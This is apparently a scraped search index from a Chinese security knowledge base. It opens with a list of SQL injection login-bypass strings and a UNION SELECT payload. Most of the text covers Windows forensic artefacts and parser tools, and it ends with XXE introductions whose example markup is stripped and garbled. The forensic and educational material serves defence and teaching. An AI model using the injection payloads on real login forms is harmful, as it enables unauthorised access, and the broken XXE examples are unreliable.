admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:21:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/1.html":{"url":"安全技术/Windows取证/1.html","title":"Audit Process Creation (592/4688)","keywords":"","body":"Audit Process Creation (592/4688) 在启用了\"审核进程创建\"时记录4688的情况下（系统默认是关闭的，需要手动开启），Windows 7、Windows Server 2008及以上版本，会在每次创建一个进程时会把事件以Event ID为4688记录到windows安全日志中 注：Windows XP/2003的Event ID为592 开启：Edit Default Domain Policy -> Policy location: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Configuration -> Detailed Tracking 策略名称: Audit Process Creation 查看ID为4688的安全事件： 命令行获取： wevtutil qe security /rd:true /f:text /q:\"Event[System[(EventID=4688)]]\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:12:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/2.html":{"url":"安全技术/Windows取证/2.html","title":"Program Inventory Event Log","keywords":"","body":"Program Inventory Event Log Program Inventorywin7及以上存在，主要用于记录软件活动摘要、安装的程序、安装的Internet Explorer加载项、更新的应用程序、已删除的应用程序 文件夹中的位置：C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Application-Experience%4Program-Inventory.evtx，如图 在Windows事件查看器的位置：Applications and Services Logs\\Microsoft\\Application-Experience\\Program-Inventory，如图 日志获取： wevtutil qe /f:text Microsoft-Windows-Application-Experience/Program-Inventory Envent IDs： 800 (summary of software activities) 900 & 901 (new Internet Explorer add-on) 903 & 904 (new application installation) 905 (updated application) 907 & 908 (removed application) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:15:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/3.html":{"url":"安全技术/Windows取证/3.html","title":"Program-Telemetry Event Log","keywords":"","body":"Program-Telemetry Event Log win7及以上存在，在应用程序启动时为应用程序处理应用程序兼容性缓存请求 文件夹中的位置：C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx 在Windows事件查看器的位置：Applications and Services Logs\\Microsoft\\Application-Experience\\Program-Telemetry，如图 日志获取： wevtutil qe /f:text Microsoft-Windows-Application-Experience/Program-Telemetry Event IDs：500/505 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:18:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/4.html":{"url":"安全技术/Windows取证/4.html","title":"ShimCache (AppCompatCache)","keywords":"","body":"ShimCache (AppCompatCache) 用来识别应用程序兼容性问题。缓存数据跟踪文件路径、大小、上次修改时间和是否被执行（取决于操作系统），Windows XP的ShimCache被限制为96条记录，此后所有版本最多保留1024条记录。 注：虽然记录在ShimCache中的存在但是并不能100%证明文件是被执行过的，但它确实显示了与文件交互的窗口 注册表位置： 注：数据加密，重启之后更新 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache 解析工具（C#）： https://github.com/ianxtianxt/AppCompatCacheParser 例子 以csv格式保存的指定路径 AppCompatCacheParser.exe --csv . 按上次修改时间排序 AppCompatCacheParser.exe --csv . -t 如果我们想离线分析，我们可以用这个项目：https://github.com/ianxtianxt/ShimCacheParser 导出注册表 reg export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\" ShimCache.reg 解析 python ShimCacheParser.py -o test.csv -r ShimCache.reg -t 结果 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:22:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/5.html":{"url":"安全技术/Windows取证/5.html","title":"UserAssist","keywords":"","body":"UserAssist 跟踪在资源管理器中打开的可执行文件和完整路径，其中UserAssist保存了windows执行的程序的运行次数和上次执行日期和时间。 注册表位置： 注：记录实时更新，数据rot-13加密 当前用户： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist 所有用户： HKEY_USERS\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist ` 解析工具：https://www.nirsoft.net/utils/userassist_view.html 图形化界面 命令行使用 UserAssistView.exe /stext out.txt //保存文本格式 UserAssistView.exe /shtml out.txt //保存html格式 UserAssistView.exe /sxml out.txt //保存xml格式 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:25:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/6.html":{"url":"安全技术/Windows取证/6.html","title":"MUICache","keywords":"","body":"MUICache 每次开始使用新的应用程序时，Windows都会自动从exe文件的版本资源中提取应用程序名，并将其存储在名为MuiCache的注册表项中，供以后使用。 注：无加密，记录实时更新 注册表位置： windows server 2003及以前的 当前用户： HKEY_CURRENT_USER/Software/Microsoft/Windows/ShellNoRoam/MUICache 所有用户： HKEY_USERS\\\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache windows server 2003及以后的 当前用户： HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache 所有用户： HKEY_USERS\\\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache 图形化界面： 解析工具：http://www.nirsoft.net/utils/muicache_view.html 命令行使用 MUICache.exe /stext out.txt //保存文本格式 MUICache.exe /shtml out.txt //保存html格式 MUICache.exe /sxml out.txt //保存xml格式 或者命令行直接查询注册表也可以 reg query \"HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:27:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/7.html":{"url":"安全技术/Windows取证/7.html","title":"RunMRU","keywords":"","body":"RunMRU 保存Win+R启动程序的历史记录 注册表位置： 注：数据无加密，记录实时更新 当前用户： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU 所有用户： HKEY_USERS\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU 命令行查询注册表 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:29:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/8.html":{"url":"安全技术/Windows取证/8.html","title":"AppCompatFlags Registry Keys","keywords":"","body":"AppCompatFlags Registry Keys 保存所有以兼容模式启动的程序（包括以管理员身份运行的程序）： 注：无加密，数据实时更新 HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers 查询方式直接查询注册表即可： reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" 保存所有执行过的程序： 解析工具：https://nirsoft.net/utils/executed_programs_list.html 这个工具会解析如下路径（包含了上面我们说过的MUICache，也包含了我们后面说的Prefetch） 注：1 ~ 4无加密，5加密，1 ~ 5数据实时更新 1. Registry Key: HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache 2. Registry Key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache 3. Registry Key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted 4. Registry Key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store 5. Windows Prefetch folder (C:\\Windows\\Prefetch) 图形化界面： 命令行解析： ExecutedProgramsList.exe /stext out.txt //保存文本格式 ExecutedProgramsList.exe /shtml out.txt //保存html格式 ExecutedProgramsList.exe /sxml out.txt //保存xml格式 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:30:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/9.html":{"url":"安全技术/Windows取证/9.html","title":"Background Activity Moderator (BAM)","keywords":"","body":"Background Activity Moderator (BAM) BAM是一个控制后台应用程序活动的Windows服务，该服务存在于windows10 version 1709及以后版本中 注册表路径为： 注：记录实时更新，数据无加密 HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\{SID} 记录包含了程序路径和上次执行日期和时间，其中执行日期键值类型为FILETIME(64bit little Endian) 执行时间提取：以winrar为例子 把filetime转化为datetime from __future__ import division import struct import sys from binascii import unhexlify from datetime import datetime, timedelta nt_timestamp = struct.unpack(\"output：2019/10/07 03:23:21 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:33:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/10.html":{"url":"安全技术/Windows取证/10.html","title":"RecentApps","keywords":"","body":"RecentApps win10之后特有，RecentApps包含了系统上已访问的多个应用程序和文件的引用。除了应用程序和文件名之外，RecentApps还提供了应用程序的路径，启动计数，文件的完整路径以及上次访问文件的时间。 注册表位置为： 注：记录实时更新，数据无加密 HKCU\\Software\\Microsoft\\Windows\\Current Version\\Search\\RecentApps RecentApps键的下面是一系列由GUID命名的子项，在RecentApps下的每个GUID子项都对应一个应用程序。一些GUID子项也具有其他子项，它们与应用程序访问的特定文件相对应。 注：LastAccessedTime是采用64位的FILETIME格式，转化为datetime也比较简单，用系统自带的w32tm.exe就行 w32tm.exe /ntte 131781889970180000 output: 152525 08:03:17.0180000 - 2018/8/8 16:03:17 或者用powershell powershell -c \"[datetime]::FromFileTime(0x1d42eee43808fa0)\" output: 2018年8月8日 16:03:17 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:33:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/11.html":{"url":"安全技术/Windows取证/11.html","title":"Prefetch","keywords":"","body":"Prefetch Prefetch是预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。之所以自动创建Prefetch文件夹，是为了加快系统启动的进程。 查看该功能是否开启： reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v EnablePrefetcher 键值代表的含义 0 = Disabled 1 = Application launch prefetching enabled 2 = Boot prefetching enabled 3 = Applaunch and Boot enabled (Optimal and Default) 位置为： 注：实时更新，数据加密 C:\\Windows\\Prefetch 解析工具:https://github.com/ianxtianxt/PECmd 参数: PECmd.exe -f \"C:\\Temp\\CALC.EXE-3FBEF7FD.pf\" PECmd.exe -f \"C:\\Temp\\CALC.EXE-3FBEF7FD.pf\" --json \"D:\\jsonOutput\" --jsonpretty PECmd.exe -d \"C:\\Temp\" -k \"system32, fonts\" PECmd.exe -d \"C:\\Temp\" --csv \"c:\\temp\" --json c:\\temp\\json PECmd.exe -d \"C:\\Windows\\Prefetch\" PS：按csv导出的有两个文件：\"time_prefix\".PECmd_Output.csv和\"time_prefix\".PECmd_Output_Timeline.csv，前者保存了详情信息，后者只保存了运行时间和可执行程序的名称 \"time_prefix\".PECmd_Output_Timeline.csv的 \"time_prefix\".PECmd_Output.csv 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:36:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/12.html":{"url":"安全技术/Windows取证/12.html","title":"JumpLists","keywords":"","body":"JumpLists 记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件 位置： %APPDATA%\\Microsoft\\Windows\\Recent 查询：直接列出文件(夹)即可 dir %APPDATA%\\Microsoft\\Windows\\Recent 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:36:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/13.html":{"url":"安全技术/Windows取证/13.html","title":"Amcache / RecentFileCache.bcf","keywords":"","body":"Amcache / RecentFileCache.bcf Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。 win7、windows server 2008R2等系统保存位置： 只包含了程序的创建时间、上次修改时间、上次访问时间和文件名 C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf win8、win10、windows server 2012等系统保存位置： 包含了文件大小、版本、sha1、二进制文件类型等等信息 注：Win7系统安装KB2952664后，也会支持Amcache.hve C:\\Windows\\AppCompat\\Programs\\Amcache.hve RecentFileCache.bcf解析工具 c#版：https://github.com/ianxtianxt/RecentFileCacheParser 用法实例： RecentFileCacheParser.exe -f \"C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf\" --csv \"c:\\temp\" RecentFileCacheParser.exe -f \"C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf\" --json \"D:\\jsonOutput\" --jsonpretty 结果 python版：https://github.com/ianxtianxt/recentfilecache-parser 用法 rfcparse.py -f C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf Amcache.hve解析工具 c#版: https://github.com/ianxtianxt/AmcacheParser python版: #!/usr/bin/python # This file is part of python-registry. # # Copyright 2015 Will Ballenthin # while at Mandiant Exe # # Licensed under the Apache License, Version 2.0 (the \"License\"); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \"AS IS\" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import sys import logging import datetime from collections import namedtuple import argparse import unicodecsv from Registry import Registry from Registry.RegistryParse import parse_windows_timestamp as _parse_windows_timestamp g_logger = logging.getLogger(\"amcache\") Field = namedtuple(\"Field\", [\"name\", \"getter\"]) def make_value_getter(value_name): \"\"\" return a function that fetches the value from the registry key \"\"\" def _value_getter(key): try: return key.value(value_name).value() except Registry.RegistryValueNotFoundException: return None return _value_getter def make_windows_timestamp_value_getter(value_name): \"\"\" return a function that fetches the value from the registry key as a Windows timestamp. \"\"\" f = make_value_getter(value_name) def _value_getter(key): try: return parse_windows_timestamp(f(key) or 0) except ValueError: return datetime.datetime.min return _value_getter def parse_unix_timestamp(qword): return datetime.datetime.fromtimestamp(qword) def parse_windows_timestamp(qword): try: return _parse_windows_timestamp(qword) except ValueError: return datetime.datetime.min def make_unix_timestamp_value_getter(value_name): \"\"\" return a function that fetches the value from the registry key as a UNIX timestamp. \"\"\" f = make_value_getter(value_name) def _value_getter(key): try: return parse_unix_timestamp(f(key) or 0) except ValueError: return datetime.datetime.min return _value_getter UNIX_TIMESTAMP_ZERO = parse_unix_timestamp(0) WINDOWS_TIMESTAMP_ZERO = parse_windows_timestamp(0) # via: http://www.swiftforensics.com/2013/12/amcachehve-in-windows-8-goldmine-for.html #Product Name UNICODE string #============================================================================== #0 Product Name UNICODE string #1 Company Name UNICODE string #2 File version number only UNICODE string #3 Language code (1033 for en-US) DWORD #4 SwitchBackContext QWORD #5 File Version UNICODE string #6 File Size (in bytes) DWORD #7 PE Header field - SizeOfImage DWORD #8 Hash of PE Header (unknown algorithm) UNICODE string #9 PE Header field - Checksum DWORD #a Unknown QWORD #b Unknown QWORD #c File Description UNICODE string #d Unknown, maybe Major & Minor OS version DWORD #f Linker (Compile time) Timestamp DWORD - Unix time #10 Unknown DWORD #11 Last Modified Timestamp FILETIME #12 Created Timestamp FILETIME #15 Full path to file UNICODE string #16 Unknown DWORD #17 Last Modified Timestamp 2 FILETIME #100 Program ID UNICODE string #101 SHA1 hash of file # note: order here implicitly orders CSV column ordering cause I'm lazy FIELDS = [ Field(\"path\", make_value_getter(\"15\")), Field(\"sha1\", make_value_getter(\"101\")), Field(\"size\", make_value_getter(\"6\")), Field(\"file_description\", make_value_getter(\"c\")), Field(\"source_key_timestamp\", lambda key: key.timestamp()), Field(\"created_timestamp\", make_windows_timestamp_value_getter(\"12\")), Field(\"modified_timestamp\", make_windows_timestamp_value_getter(\"11\")), Field(\"modified_timestamp2\", make_windows_timestamp_value_getter(\"17\")), Field(\"linker_timestamp\", make_unix_timestamp_value_getter(\"f\")), Field(\"product\", make_value_getter(\"0\")), Field(\"company\", make_value_getter(\"1\")), Field(\"pe_sizeofimage\", make_value_getter(\"7\")), Field(\"version_number\", make_value_getter(\"2\")), Field(\"version\", make_value_getter(\"5\")), Field(\"language\", make_value_getter(\"3\")), Field(\"header_hash\", make_value_getter(\"8\")), Field(\"pe_checksum\", make_value_getter(\"9\")), Field(\"id\", make_value_getter(\"100\")), Field(\"switchbackcontext\", make_value_getter(\"4\")), ] ExecutionEntry = namedtuple(\"ExecutionEntry\", map(lambda e: e.name, FIELDS)) def parse_execution_entry(key): return ExecutionEntry(**dict((e.name, e.getter(key)) for e in FIELDS)) class NotAnAmcacheHive(Exception): pass def parse_execution_entries(registry): try: volumes = registry.open(\"Root\\\\File\") except Registry.RegistryKeyNotFoundException: raise NotAnAmcacheHive() ret = [] for volumekey in volumes.subkeys(): for filekey in volumekey.subkeys(): ret.append(parse_execution_entry(filekey)) return ret TimelineEntry = namedtuple(\"TimelineEntry\", [\"timestamp\", \"type\", \"entry\"]) def main(argv=None): if argv is None: argv = sys.argv parser = argparse.ArgumentParser( description=\"Parse program execution entries from the Amcache.hve Registry hive\") parser.add_argument(\"registry_hive\", type=str, help=\"Path to the Amcache.hve hive to process\") parser.add_argument(\"-v\", action=\"store_true\", dest=\"verbose\", help=\"Enable verbose output\") parser.add_argument(\"-t\", action=\"store_true\", dest=\"do_timeline\", help=\"Output in simple timeline format\") args = parser.parse_args(argv[1:]) if args.verbose: logging.basicConfig(level=logging.DEBUG) else: logging.basicConfig(level=logging.INFO) if sys.platform == \"win32\": import os, msvcrt msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY) r = Registry.Registry(args.registry_hive) try: ee = parse_execution_entries(r) except NotAnAmcacheHive: g_logger.error(\"doesn't appear to be an Amcache.hve hive\") return if args.do_timeline: entries = [] for e in ee: for t in [\"source_key_timestamp\", \"created_timestamp\", \"modified_timestamp\", \"modified_timestamp2\", \"linker_timestamp\"]: ts = getattr(e, t) if ts == UNIX_TIMESTAMP_ZERO: continue if ts == WINDOWS_TIMESTAMP_ZERO: continue if ts == datetime.datetime.min: continue entries.append(TimelineEntry(ts, t, e)) w = unicodecsv.writer(sys.stdout, delimiter=\"|\", quotechar=\"\\\"\", quoting=unicodecsv.QUOTE_MINIMAL, encoding=\"utf-8\") w.writerow([\"timestamp\", \"timestamp_type\", \"path\", \"sha1\"]) for e in sorted(entries, key=lambda e: e.timestamp): w.writerow([e.timestamp, e.type, e.entry.path, e.entry.sha1]) else: w = unicodecsv.writer(sys.stdout, delimiter=\"|\", quotechar=\"\\\"\", quoting=unicodecsv.QUOTE_MINIMAL, encoding=\"utf-8\") w.writerow(map(lambda e: e.name, FIELDS)) for e in ee: w.writerow(map(lambda i: getattr(e, i.name), FIELDS)) if __name__ == \"__main__\": main(argv=sys.argv) powershell版: function Get-Amcache { #Requires -Version 3.0 Get-Amcache -Since 9/1/2015 -Ext exe PS C:\\> Get-Amcache -Since 9/1/2015 -Filename *install* -Ext exe #> [CmdletBinding()] Param ( [Parameter(HelpMessage=\"Location of Amcache.hve file\")] [String]$RegHive = $env:SYSTEMROOT + \"\\AppCompat\\Programs\\Amcache.hve\", [Parameter(HelpMessage=\"Destination registry key to load amcache hive to\")] [String]$DestRegKey = \"HKLM\\amcache\", [Parameter(HelpMessage=\"Amount of amcache history cutoff date. Defaults to 90 days back.\")] [ValidatePattern(\"^\\d{1,2}/\\d{1,2}/\\d{4}$\")] [String]$Since = (Get-Date).AddDays(-90).ToString('MM/dd/yyyy'), [Parameter(HelpMessage=\"Specify the file extension to match. Matches all by default.\")] [ValidatePattern(\"^exe|dll|sys$\")] [String]$Ext = \"*\", [Parameter(HelpMessage=\"Specify a filename to match.\")] [String]$Filename=\"*\", [Switch]$Descending = $false ) try { reg.exe load $DestRegKey $RegHive | Out-Null $rootfile = $DestRegKey.replace(\"\\\", \":\") + \"\\Root\\File\" if (-not [IO.Path]::GetExtension($Filename)) { $Filename = $Filename + \"*\"} $sortparams = @{ Property = \"TimestampLastModified\" } if ($Descending) { $sortparams.Descending = $true } Get-ChildItem -Recurse -Path $rootfile | Get-ItemProperty | ` foreach { $ts_created = \"\" $ts_lastmodified = \"\" $ts_compile = \"\" if ($_.f) { $origin = [TimeZone]::CurrentTimeZone.ToLocalTime([datetime]'1/1/1970') $ts_compile = $origin.AddSeconds($_.f) } if ($_.12) { $ts_created = [DateTime]::FromFileTime($_.12) } if ($_.17) { $ts_lastmodified = [DateTime]::FromFileTime($_.17)} if ([IO.Path]::GetExtension($_.15) -like \".\" + $Ext ` -and [IO.Path]::GetFilename($_.15) -like $Filename) { New-Object psobject -Property @{ ProductName = $_.0 CompanyName = $_.1 FileVersionNo = $_.2 LangCode = $_.3 SwitchBackContext = $_.4 FileVersion = $_.5 FileSize = $_.6 PEHeaderImageSize = $_.7 PEHeaderHash = $_.8 PEHeaderChecksum = $_.9 FileDescription = $_.c TimestampCompile = $ts_compile TimestampCreated = $ts_created FilePath = $_.15 TimestampLastModified = $ts_lastmodified ProgramID = $_.100 SHA1Hash = $_.101 } } } | Where { $_.TimestampLastModified -gt $Since } ` | Sort-Object @sortparams } catch { $ErrorMessage = $_.Exception.Message Write-Output $ErrorMessage break } finally { [gc]::collect() [gc]::WaitForPendingFinalizers() reg.exe unload $DestRegKey | Out-Null } } 用法示例： AmcacheParser.exe -f \"C:\\Windows\\AppCompat\\Programs\\Amcache.hve\" --csv C:\\temp AmcacheParser.exe -f \"C:\\Windows\\AppCompat\\Programs\\Amcache.hve\" -i on --csv C:\\temp AmcacheParser.exe -f \"C:\\Windows\\AppCompat\\Programs\\Amcache.hve\" -w \"c:\\temp\\whitelist.txt\" --csv C:\\temp 如果我们直接执行的话，会提示：\"正由另一进程使用，因此该进程无法访问此文件\" 解决方法是把Amcache.hve复制到其它目录，我们可以使用shadow copy把Amcache.hve复制到当前目录，然后再执行就可以了 结果 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:43:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/14.html":{"url":"安全技术/Windows取证/14.html","title":"SRUM (System Resource Usage Monitor)","keywords":"","body":"SRUM (System Resource Usage Monitor) Technology that monitors desktop application programs,services, windows apps and network connections 适用于win8及以上系统，数据加密，实时记录 可以使用python解析：https://github.com/ianxtianxt/srum-dump 用法实例： srum_dump2.exe --SRUM_INFILE c:\\Windows\\system32\\sru\\SRUDB.dat python srum_dump2.py --SRUM_INFILE c:\\Windows\\system32\\sru\\SRUDB.dat 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:44:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/15.html":{"url":"安全技术/Windows取证/15.html","title":"win10时间轴","keywords":"","body":"win10时间轴 Windows Timeline是Windows10在1803版中引入的一个新特性 用户可以使用Win + Tab可以对其进行访问，时间轴就像浏览器的历史记录一样，它记录了包含您访问过的网站，还包含您编辑的文档，您玩过的游戏，您查看或创建的图像等，其保存的记录在ActivitiesCache.db之中 ActivitiesCache.db位置在 注：无加密，数据实时更新 C:\\Users\\\\AppData\\Local\\ConnectedDevicesPlatform\\\\ActivitiesCache.db 本质是sqlite3数据库文件，它包含的表如下 其中最重要的一个表是Activity，Activity表包含的字段有AppId（包含应用程序的路径），开始时间，结束时间等等 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:45:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows取证/16.html":{"url":"安全技术/Windows取证/16.html","title":"计划任务","keywords":"","body":"计划任务 计划任务往往是一个值得关注的点也是一个容易忽略的点。站在攻击的角度来讲，计划任务可以持久化后门、执行指定恶意程序等等；站在防御、取证的角度来讲，计划任务执行之后，系统是不会自动删除的（重启或者注销也是不会删除的），这就可能导致入侵者会忽略把计划任务清除，这就有利于我们的取证 列出所有任务 cmd： schtasks.exe powershell： Get-ScheduledTask 根据文件夹列出所有任务 powershell: Get-ScheduledTask -TaskPath \"\\\" 根据任务名查看任务的详情信息 schtasks.exe /query /v /tn test /fo list 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:46:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/1.html":{"url":"安全技术/XXE/1.html","title":"XXE 简介","keywords":"","body":"XXE 简介 XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。Java中的XXE支持sun.net.www.protocol里面的所有协议：http，https，file，ftp，mailto，jar，netdoc 。一般利用file协议读取文件、利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:35:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/2.html":{"url":"安全技术/XXE/2.html","title":"XXE 相关基础概念","keywords":"","body":"XXE 相关基础概念 XML&DTD XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据 DTD(文档类型定义，Document Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。 实体ENTITY XML中的实体类型，一般有下面几种：字符实体，命名实体（或内部实体）、外部实体（包含分为：外部普通实体、外部参数实体）。除外部参数实体外，其他实体都以字符（&）开始以字符（；）结束。 DTD引用方式 a)DTD 内部声明 b)DTD 外部引用 c)引用公共DTD 0x1:字符实体 字符实体类似html的实体编码，形如a(十进制)或者a（十六进制）。 0x2:命名实体（内部实体） 内部实体又叫命名实体。命名实体可以说成是变量声明，命名实体只能生命在DTD或者XML文件开始部分（语句中）。 命名实体（或内部实体语法）: 如： ]> &x;&y; 说明： 定义一个实体名称x 值为First Param! &x; 引用实体x 知道以上语法后，可以使用名为foo的数据类型定义（DTD）构造如下请求: request: POST http://example.com/xml HTTP/1.1 ]> Hello &bar; respone: HTTP/1.0 200 OK Hello World bar元素是单词“World”的别名 。看起来这样的内部实体似乎无害，但攻击者可以使用XML实体通过在实体内的实体内嵌入实体来导致拒绝服务攻击。通常被称为“ （Billion Laughs attack）十亿笑攻击 ”。某些XML解析器会自动限制它们可以使用的内存量。 如： request: POST http://example.com/xml HTTP/1.1 ]> Hello &t3; response: HTTP/1.0 200 OK Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World 0x3):外部普通实体 外部实体用于加载外部文件的内容。(显示XXE攻击主要利用普通实体) 外部普通实体语法： 如： ]> &xxe; ]> &outfile; 0x4):外部参数实体 or 参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符(;)结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。(Blind XXE攻击常利用参数实体进行数据回显) 示例： 第一个例子 %xxe;]> &evil; 外部evil.dtd中的内容。 第二个例子 %dtd; ]> &content combine.dtd的内容为： 说明： 上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。 解析后…中的内容为Hello World。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:46:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && 